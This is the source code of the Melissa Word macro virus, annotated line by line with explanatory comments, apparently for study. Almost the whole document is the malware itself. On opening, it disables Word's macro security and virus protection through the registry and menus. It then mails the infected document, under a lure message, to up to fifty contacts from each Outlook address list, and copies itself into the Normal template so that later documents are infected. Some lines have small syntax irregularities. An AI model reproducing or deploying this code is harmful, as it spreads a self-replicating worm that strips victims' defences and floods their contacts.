'Melissa Virus Source Code

'This line defines a private subroutine named Document_Open, which is an event handler. It triggers when the infected Word document is opened.
Private Sub Document_Open()
    'This line tells the script to continue running even if an error is encountered, essentially suppressing error messages.
    On Error Resume Next
    'This line checks the Windows Registry for a specific value related to Word's security settings. If the value is not empty, it means that the virus has already modified these settings.
    If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> ""
    ' If the virus has already modified the security level settings
    Then
        'If the previous condition is met, this line disables the "Security..." control in the "Macro" menu, further attempting to disable Word's security features.
        CommandBars("Macro").Controls("Security...").Enabled = False
        'This line sets the "Level" value in the Windows Registry to 1, potentially altering Word's security settings.
        System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    Else
        'This line attempts to disable the "Macro" control in the "Tools" menu.
        CommandBars("Tools").Controls("Macro").Enabled = False
        'These lines attempt to disable various Word options related to confirming conversions and saving normal prompts.
        Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1):
        Options.SaveNormalPrompt = (1 - 1)
    End If

    'This line declares three variables: UngaDasOutlook, DasMapiName, and BreakUmOffASlice without specifying their data types. These variables will be used to interact with the Outlook application.
    ' UngaDasOutlook is an instance of the Outlook application.
    ' DasMapiName is a reference to the MAPI (Messaging Application Programming Interface) namespace within Outlook.
    ' BreakUmOffASlice is a reference to an email object
    Dim UngaDasOutlook, DasMapiName, BreakUmOffASlice
    'This line creates an instance of the Outlook application and assigns it to the UngaDasOutlook variable. It allows the script to interact with Outlook.
    Set UngaDasOutlook = CreateObject("Outlook.Application")
    'Here, the script sets DasMapiName to reference the MAPI (Messaging Application Programming Interface) namespace within Outlook.
    Set DasMapiName = UngaDasOutlook.GetNameSpace("MAPI")
    'This line checks the Windows Registry for a value named "Melissa?" under the specified registry key. If the value is not equal to "... by Kwyjibo," it means the virus has not yet infected the system.
    If System.PrivateProfileString("",
    "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Melissa?") <> "... by Kwyjibo"
    Then

    'This condition checks if the variable UngaDasOutlook is equal to the string "Outlook.", which indicates that the outlook application instance is created. If it's true, the script proceeds.
        If UngaDasOutlook = "Outlook" Then
            'This line attempts to log into an Outlook profile, but it lacks specific profile and password information.
            DasMapiName.Logon "profile", "password"
            'The script then enters a loop that iterates through the address books in Outlook and sends the infected document to recipients from the address book. It constructs the email subject, body text, and attaches the infected document to the email.
            For y = 1 To DasMapiName.AddressLists.Count
                Set AddyBook = DasMapiName.AddressLists(y)
                x = 1
                Set BreakUmOffASlice = UngaDasOutlook.CreateItem(0)
                For oo = 1 To AddyBook.AddressEntries.Count
                    Peep = AddyBook.AddressEntries(x)
                    BreakUmOffASlice.Recipients.Add Peep
                    x = x + 1
                    If x > 50 Then oo = AddyBook.AddressEntries.Count
                Next oo
                BreakUmOffASlice.Subject = "Important Message From " &
                Application.UserName
                BreakUmOffASlice.Body = "Here is that document you asked for ... don't
                show anyone else ;-)"
                BreakUmOffASlice.Attachments.Add ActiveDocument.FullName
                BreakUmOffASlice.Send
                Peep = ""

            Next y
            ' Log off from Outlook.
            DasMapiName.Logoff
        End If

    'In this line, the code sets a value in the Windows Registry under a specific key. It uses System.PrivateProfileString to write a string value named "Melissa?" under the registry key HKEY_CURRENT_USER\Software\Microsoft\Office\. The value assigned to it is "... by Kwyjibo". This line indicates that the system is now marked as infected with the Melissa virus.
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Melissa?") = "... by Kwyjibo"
    End If

    'These two lines set references to the first Visual Basic for Applications (VBA) components in the document (typically, the macro-enabled code within the Word document) and in the NormalTemplate (the template used for new documents).
    Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
    Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)

    'These lines count the number of lines of code in the NormalTemplate (NTCL) and the document's VBA component (ADCL).
    NTCL = NTI1.CodeModule.CountOfLines
    ADCL = ADI1.CodeModule.CountOfLines
    'This line initializes a variable BGN to 2.
    BGN = 2
    'This conditional statement checks if the name of the document's VBA component (ADI1.Name) is not equal to "Melissa." If it's not "Melissa," it means the virus code hasn't already infected the VBA component.
    If ADI1.Name <> "Melissa" Then
        'This nested condition checks if there are existing lines of code in the document's VBA component (ADCL > 0). If there are, it deletes all of them using ADI1.CodeModule.DeleteLines.
        If ADCL > 0 Then _
            'After clearing the existing code, the script sets a reference to the document's VBA component (ToInfect = ADI1), names the component "Melissa" (ADI1.Name = "Melissa"), and sets a flag DoAD to true, indicating that the document's VBA component has been infected with the Melissa code.
            ADI1.CodeModule.DeleteLines 1, ADCL
            Set ToInfect = ADI1
            ADI1.Name = "Melissa"
            DoAD = True
        End If
    'This conditional statement checks if the name of the NormalTemplate's VBA component (NTI1.Name) is not equal to "Melissa."
    If NTI1.Name <> "Melissa" Then
        'This nested condition checks if there are existing lines of code in the NormalTemplate's VBA component (NTCL > 0). If there are, it deletes all of them using 
        If NTCL > 0 Then _
            NTI1.CodeModule.DeleteLines 1, NTCL
            'After clearing the existing code in the NormalTemplate's VBA component, the script sets a reference to the NormalTemplate's VBA component (ToInfect = NTI1), names the component "Melissa" (NTI1.Name = "Melissa"), and sets a flag DoNT to true, indicating that the NormalTemplate's VBA component has been infected with the Melissa code.
            Set ToInfect = NTI1
            NTI1.Name = "Melissa"
            DoNT = True
        End If

    'This line checks whether neither DoAD nor DoNT is true (indicating that neither the document's VBA component nor the NormalTemplate's VBA component was infected). If both are not infected, the code jumps to the label CYA.
    If DoNT <> True And DoAD <> True Then GoTo CYA

    If DoNT = True Then
        'It clears any blank lines at the beginning of the document's VBA code.
        Do While ADI1.CodeModule.Lines(1, 1) = ""
            ADI1.CodeModule.DeleteLines 1
        Loop

        'It adds a Private Sub Document_Close() subroutine to the NormalTemplate and copies the code from the document's VBA component to the NormalTemplate's VBA component.
        ToInfect.CodeModule.AddFromString ("Private Sub Document_Close()")
        'It clears any blank lines at the beginning of the NormalTemplate's VBA code.
        Do While ADI1.CodeModule.Lines(BGN, 1) <> ""
            ToInfect.CodeModule.InsertLines BGN, ADI1.CodeModule.Lines(BGN, 1)
            BGN = BGN + 1
        Loop
    End If

    'If DoAD is true, the script will clear any blank lines at the beginning of the NormalTemplate's VBA code.
    If DoAD = True Then
        Do While NTI1.CodeModule.Lines(1, 1) = ""
            NTI1.CodeModule.DeleteLines 1
        Loop

    'It adds a Private Sub Document_Open() subroutine to the document's VBA component and copies the code from the NormalTemplate's VBA component to the document's VBA component.
    ToInfect.CodeModule.AddFromString ("Private Sub Document_Open()")

    ' This line initiates a loop using a "Do While" statement. The loop will continue as long as the condition specified within the parentheses remains true. In this case, the condition checks whether the line of code at position BGN in the CodeModule of the NTI1 object is not empty (i.e., it contains code).
    ': Within the loop, this line inserts the code from the NTI1 object's CodeModule into the CodeModule of the ToInfect object. Specifically, it inserts the line of code at position BGN in the NTI1 object's CodeModule into the same position (BGN) in the ToInfect object's CodeModule. This effectively copies the code from one location to another within the VBA project.
    Do While NTI1.CodeModule.Lines(BGN, 1) <> ""
        ToInfect.CodeModule.InsertLines BGN, NTI1.CodeModule.Lines(BGN, 1)
        BGN = BGN + 1
    Loop
    End If

    'This label is used as a point to which the script can jump. It doesn't execute any specific action itself.
    CYA:
    'These lines involve various conditions related to the document's name and the presence of lines of code in the VBA components. The script may save the document under certain conditions.
    If NTCL <> 0 And ADCL = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) 
        Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
        ActiveDocument.Saved = True: 
    End If
    'WORD/Melissa written by Kwyjibo
    'Works in both Word 2000 and Word 97
    'Worm? Macro Virus? Word 97 Virus? Word 2000 Virus? You Decide!
    'Word -> Email | Word 97 <--> Word 2000 ... it's a new age!
    If Day(Now) = Minute(Now) 
        Then Selection.TypeText " Twenty-two points, plus triple-word-score, plus fifty points for using all my letters.  Game's over. I'm outta here."
' Close the document
End Sub